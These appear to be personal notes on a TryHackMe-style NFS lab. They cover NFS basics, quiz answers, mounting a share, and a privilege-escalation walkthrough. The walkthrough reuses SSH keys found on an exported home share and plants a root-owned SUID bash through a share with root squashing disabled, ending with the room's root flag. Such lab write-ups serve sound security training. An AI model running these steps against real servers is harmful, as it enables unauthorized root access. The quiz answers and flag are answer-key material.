## NFS 


### **What is NFS?**

NFS (==Network File System==) allows systems to share directories and files over a network. It enables users and programs to access files on remote systems as if they were local. NFS achieves this by mounting a portion of the file system from a server, with access controlled by assigned privileges.

---

### **How Does NFS Work?**

1. **Mounting a Directory**:
    
    - A client requests to mount a remote directory to a local one, similar to mounting a physical device.
    - The mount service connects to the mount daemon via RPC.
2. **Server Validation**:
    
    - The server checks the user's permissions to access the directory and returns a **file handle** to uniquely identify files/directories on the server.
3. **File Access**:
    
    - To access a file, the client sends an RPC call to the server's **NFS daemon (NFSD)**.
    - The call includes:
        - File handle
        - File name
        - User's ID and group ID
    - These details determine user permissions (e.g., read/write access).

---

### **NFS Compatibility**

- NFS allows file sharing between systems running Windows, Linux, MacOS, or UNIX.
- Windows Server can act as an NFS server for non-Windows clients, and vice versa.

---

### **Additional Resources**

- [Oracle Documentation on NFS](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)
- [Datto: What is NFS File Share?](https://www.datto.com/blog/what-is-nfs-file-share/)
- [NFS SourceForge Documentation](http://nfs.sourceforge.net/)
- [Arch Linux Wiki on NFS](https://wiki.archlinux.org/index.php/NFS)

---

`What process allows an NFS client to interact with a remote directory as though it was a physical device?`

`Mounting
`
`What protocol does NFS use to communicate between the server and client?`

`RPC`


`What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2`

`user id / group id`


`What is the latest version of NFS? [released in 2016, but is still up to date as of 2020]` 

`4.2`


### NFS-Common Installation and Setup

#### **NFS-Common Package Overview**

To interact with NFS shares, you need to install the **nfs-common** package. It includes tools for mounting and interacting with NFS shares, such as:

- **showmount**: to list available shares on the server.
- **mount.nfs**: to mount the NFS share to your local system.

Install it with:

```bash
sudo apt install nfs-common
```

#### **Mounting NFS Shares**

1. **Create a Mount Point**: You first need to create a directory where you will mount the NFS share.
    
    ```bash
    sudo mkdir /tmp/mount
    ```
    
2. **Mount the NFS Share**: Use the `mount` command to mount the NFS share.
    
    ```bash
    sudo mount -t nfs <IP_ADDRESS>:<share_name> /tmp/mount/ -nolock
    ```
    
    - Replace `<IP_ADDRESS>` with the IP address of the NFS server.
    - Replace `<share_name>` with the specific NFS share.

###### **Explanation of Command**

- **sudo**: Run with superuser privileges.
- **mount**: Mount command to attach the NFS share to your system.
- **-t nfs**: Specifies the type of filesystem to mount (NFS).
- **IP:share**: The NFS server's IP and the share you want to mount.
- **-nolock**: Prevents the use of NLM (Network Lock Manager) locking.

This will allow you to interact with the NFS server's shared resources.



### Enumuration 

Based on the Nmap scan output, the NFS service is running on port 2049 (`nfs 3-4 (RPC #100003)`), but to list the available NFS shares, you need to use the `showmount` command.

To find the visible share, run the following command:

```bash
sudo /usr/sbin/showmount -e 10.10.150.50
```

This will display the list of NFS shares available on the server at IP `10.10.150.50`. The name of the visible share will be listed under the "Export list" section.



The error message `mount.nfs: mount point /tmp/mount/ does not exist` indicates that the directory `/tmp/mount/` does not exist on your system. You need to create the directory before attempting to mount the NFS share.

###### Solution:

1. **Create the mount point directory**: Run the following command to create the `/tmp/mount/` directory:
    
    ```bash
    sudo mkdir -p /tmp/mount
    ```
    
2. **Mount the NFS share again**: Now, try mounting the NFS share again:
    
    ```bash
    sudo mount -t nfs IP:Share /tmp/mount/ -nolock
    ```
    
			└─$ sudo mount -t nfs 10.10.150.50:/home /tmp/mount/ -nolock

> after coppying the shares to /tmp/mount cd'd  and looked for important files ,
> 
> found ssh files they have keys so i logged in via ssh after changing the permetions to ==chmod 600==



### NFS Access for Privilege Escalation

Let's break down the process of leveraging NFS shares to escalate privileges by bypassing `root_squash` and using **SUID** files.

#### **Step 1: Check NFS Root Squashing**

`root_squash` is a configuration in NFS that prevents remote users from gaining root access to the NFS share. If disabled, a remote user can escalate privileges.

To check whether root squashing is disabled, you'll need to query the NFS server for configuration settings. Typically, this information is found in `/etc/exports`. If root squashing is disabled, remote users could have root access to the NFS share.

#### **Step 2: Upload a Bash Executable to NFS**

Once you have access to the NFS share, the next step is uploading an executable that will allow you to escalate privileges.

###### Summary of Steps:

1. NFS Access
2. Gain low-privilege shell
3. Upload bash executable to NFS share
4. Set SUID permissions through misconfigured root squashing
5. SSH into target
6. Execute the bash shell with SUID to escalate to root access

By completing this sequence, you'll have successfully escalated privileges to root on the target machine using NFS shares and SUID binaries.



###### Steps to Complete the Privilege Escalation

Let's walk through the steps to escalate privileges and find the root flag.

#### **1. Navigate to the NFS Mount Point**

After mounting the NFS share, first navigate to the mount point where the share is accessible.

```bash
cd /tmp/mount/
```

Now, navigate to the user's home directory:

```bash
cd /home/username/
```

#### **2. Download the Bash Executable**

Download the bash executable to your `Downloads` directory using `wget` or `scp` from the target machine.

```bash
scp -i key_name username@10.10.150.50:/bin/bash ~/Downloads/bash
```

#### **3. Copy the Bash Executable to the NFS Share**

Once the `bash` executable is in your `Downloads` folder, copy it to the NFS share:

```bash
cp ~/Downloads/bash .
```

#### **4. Change Ownership to Root**

To allow the executable to run with root privileges, change the ownership of the file to `root`:

```bash
sudo chown root bash
```

#### **5. Set the SUID Bit**

Now, set the SUID bit on the bash executable. The SUID bit allows the file to be executed with the privileges of the file's owner (in this case, root). To set the SUID bit using `chmod`, you use the letter `s`:

```bash
sudo chmod +s bash
```

#### **6. Check Permissions**

Verify that the permissions are set correctly using `ls -la bash`. The output should show the permissions ending with `-rwsr-xr-x`, indicating the SUID bit is set.

```bash
ls -la bash
```

Example output:

```bash
-rwsr-sr-x 1 root root 1234567 Jan 8 23:00 bash
```

#### **7. SSH into the Target Machine**

Log into the target machine using SSH with the credentials you have.

```bash
ssh -i key_name username@10.10.150.50
```

#### **8. Verify Bash Executable Exists**

Once logged in, confirm that the `bash` executable is present in the directory by listing the contents:

```bash
ls -la
```

Make sure the `bash` file is there.

#### **9. Execute the Bash Shell with SUID**

Run the bash shell with the `-p` flag to preserve the permissions:

```bash
./bash -p
```

The `-p` option ensures that the permissions are preserved and that the bash shell runs with root privileges.

#### **10. Gaining Root Access**

Once you've executed the command, you should now have a root shell! You can confirm root access by running:

```bash
whoami
```

You should see `root`.

#### **11. Find the Root Flag**

Finally, locate the root flag in the `/root` directory and display it:

```bash
cat /root/root.txt
```

The root flag should be:

```
THM{nfs_got_pwned}
```

###### Conclusion

Congratulations, you've successfully used the NFS share and SUID bit to escalate privileges and obtain the root flag!